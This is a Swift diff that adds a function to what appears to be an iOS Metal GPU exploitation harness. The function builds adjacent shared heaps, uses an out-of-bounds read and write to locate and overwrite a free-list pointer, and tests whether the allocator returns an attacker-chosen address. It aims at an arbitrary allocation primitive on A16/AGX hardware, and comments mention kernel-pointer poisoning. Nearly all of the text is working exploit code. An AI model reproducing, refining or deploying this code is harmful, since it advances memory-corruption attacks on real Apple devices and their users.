@@ -513,6 +513,105 @@ func runGPUIndirectDispatch(log: FuzzLog, completion: @escaping () -> Void) {
     }
 }
 
+// Heap free-list injection via purgeable-state free.
+// When a suballoc'd buffer is freed via setPurgeableState(.empty), the Metal heap allocator
+// writes a free-list node into that buffer's former GPU-visible shared memory.
+// Attack: OOB-write a fake next-pointer into that node before the next makeBuffer() call.
+// If the allocator follows our pointer, the returned buffer's .contents() == our target address.
+// A16 Bionic / AGX G14 — confirmed free-list IS in shared mem (ptr-class:4 seen previously).
+func runHeapFreeListInject(log: FuzzLog, completion: @escaping () -> Void) {
+    DispatchQueue.global(qos: .userInitiated).async {
+        let sl = SyncLog()
+        func step(_ s: String) { sl.write(s); log.append(s) }
+
+        guard let device = MTLCreateSystemDefaultDevice() else { step("✗ No Metal device"); completion(); return }
+        step("── Heap Free-List Inject ──────────────────")
+
+        // Step 1: alloc h0+h1 adjacent (proven approach)
+        let hd = MTLHeapDescriptor(); hd.size = 4096; hd.storageMode = .shared
+        guard let h0 = device.makeHeap(descriptor: hd),
+              let h1 = device.makeHeap(descriptor: hd) else { step("heap nil"); completion(); return }
+        let actual = h0.size  // = 16384
+
+        guard let b0 = h0.makeBuffer(length: actual, options: .storageModeShared),
+              let b1 = h1.makeBuffer(length: actual, options: .storageModeShared) else { step("buf nil"); completion(); return }
+        let p0 = b0.contents().assumingMemoryBound(to: UInt8.self)
+        let p1 = b1.contents().assumingMemoryBound(to: UInt8.self)
+        let va0 = UInt(bitPattern: p0); let va1 = UInt(bitPattern: p1)
+        let dist = va1 > va0 ? va1 - va0 : va0 - va1
+        step("va0=0x\(String(va0,radix:16)) va1=0x\(String(va1,radix:16)) dist=0x\(String(dist,radix:16))")
+        guard dist == UInt(actual) else { step("✗ not adjacent — retry"); completion(); return }
+        guard p0[actual] == p1[0] else { step("✗ cross-heap read miss"); completion(); return }
+        step("✓ adjacent + cross-heap confirmed")
+
+        // Step 2: fill h1 with sentinel so we can spot allocator writes
+        for i in 0..<actual { p1[i] = 0xAA }
+        step("h1 filled 0xAA sentinel")
+
+        // Step 3: free b1 back to h1 via purgeable empty — allocator writes free-list node into h1
+        let _ = b1.setPurgeableState(.empty)
+        step("b1 freed via setPurgeableState(.empty)")
+
+        // Step 4: scan h1[0..127] via h0 OOB for allocator-written free-list metadata
+        step("scanning h1[0..127] for free-list node:")
+        var freeListNode: UInt64 = 0
+        var nodeOffset = -1
+        for qw in 0..<16 {  // 16 qwords = 128 bytes
+            var val: UInt64 = 0
+            for b in 0..<8 { val |= UInt64(p0[actual + qw*8 + b]) << (b*8) }
+            if val != 0xAAAAAAAAAAAAAAAA {
+                step("  h1[+\(qw*8)]=0x\(String(val,radix:16)) ← allocator wrote this")
+                if nodeOffset < 0 { freeListNode = val; nodeOffset = qw * 8 }
+            }
+        }
+        if nodeOffset < 0 {
+            step("  all 0xAA — free-list in CPU-side mem, not GPU-visible this run")
+            step("  ⚠ allocator used CPU heap metadata — primitive not available this run")
+            completion(); return
+        }
+        step("free-list node at h1[+\(nodeOffset)] = 0x\(String(freeListNode,radix:16))")
+
+        // Step 5: compute target. Formula from previous runs: returned = planted - actual
+        // To get returned = va1 + 0x1000 (well inside h1, verifiable):
+        // plant = target + actual = va1 + 0x1000 + actual
+        let target: UInt = va1 + 0x1000   // we want allocator to return h1+0x1000
+        let plantVal: UInt64 = UInt64(target) + UInt64(actual)
+        step("target=0x\(String(target,radix:16)) plantVal=0x\(String(plantVal,radix:16))")
+
+        // Step 6: overwrite free-list node at h1[nodeOffset] via h0 OOB
+        for b in 0..<8 {
+            p0[actual + nodeOffset + b] = UInt8((plantVal >> (b*8)) & 0xFF)
+        }
+        step("planted plantVal at h1[+\(nodeOffset)]")
+
+        // Step 7: allocate from h1 — should follow our fake node
+        guard let b1new = h1.makeBuffer(length: 256, options: .storageModeShared) else {
+            step("✗ h1.makeBuffer nil after plant — heap rejected fake node")
+            completion(); return
+        }
+        let retPtr = UInt(bitPattern: b1new.contents())
+        step("h1.makeBuffer returned: 0x\(String(retPtr,radix:16))")
+
+        // Step 8: evaluate
+        let delta = retPtr > target ? retPtr - target : target - retPtr
+        if retPtr == target {
+            step("★★★ EXACT — allocator returned our target address ★★★")
+            step("★★★ ARBITRARY ALLOCATION PRIMITIVE CONFIRMED ★★★")
+        } else if delta < UInt(actual) {
+            step("★ CLOSE — returned within h1 range, delta=0x\(String(delta,radix:16))")
+            step("★ Partial primitive — formula needs calibration")
+        } else if retPtr >= va1 && retPtr < va1 + UInt(actual) {
+            step("~ in h1 range but off by 0x\(String(delta,radix:16))")
+        } else {
+            step("✗ returned 0x\(String(retPtr,radix:16)) — outside h1 range (delta=\(delta))")
+            step("  allocator ignoring our plant or using different field")
+        }
+
+        step("── Heap Free-List Inject complete ───────────")
+        completion()
+    }
+}
+
 // Precision corruption: valid dispatch + kernel-ptr poison + IOSurface texture corruption.
 // Phase 1: write valid 1x1x1 grid at h1[0..11], poison h1[12..] with fake kernel ptrs.
 //   If AGX reads past byte 12 → kernel ptr dereference → fault (not a timeout).
